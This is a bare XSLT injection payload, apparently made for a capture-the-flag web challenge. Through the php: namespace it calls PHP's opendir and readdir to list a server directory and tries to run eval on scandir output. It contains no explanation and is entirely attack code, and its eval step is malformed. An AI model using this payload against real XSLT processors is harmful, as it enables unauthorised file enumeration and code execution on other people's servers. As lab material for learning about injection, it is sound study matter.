<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:value-of select="php:function('opendir', '/challenge/web-serveur/ch50/')"/>
1:<xsl:value-of select="php:function('readdir')"/>  
2:<xsl:value-of select="php:function('readdir')"/>
3:<xsl:value-of select="php:function('readdir')"/>
4:<xsl:value-of select="php:function('readdir')"/>
5:<xsl:value-of select="php:function('readdir')"/>  
6:<xsl:value-of select="php:function('readdir')"/>  
7:<xsl:value-of select="php:function('readdir')"/>
8:<xsl:value-of select="php:function('readdir')"/>
9:<xsl:value-of select="php:function('readdir')"/>
10:<xsl:value-of select="php:function('readdir')"/>  
11:<xsl:value-of select="php:function('readdir')"/>  
12:<xsl:value-of select="php:function('readdir')"/>
13:<xsl:value-of select="php:function('readdir')"/>
 
<xsl:variable name="eval" select="var_dump(scandir('.'));"/>
  <xsl:value-of select="php:function('eval',string($eval))"/> 

  
  

</body>
</html> 
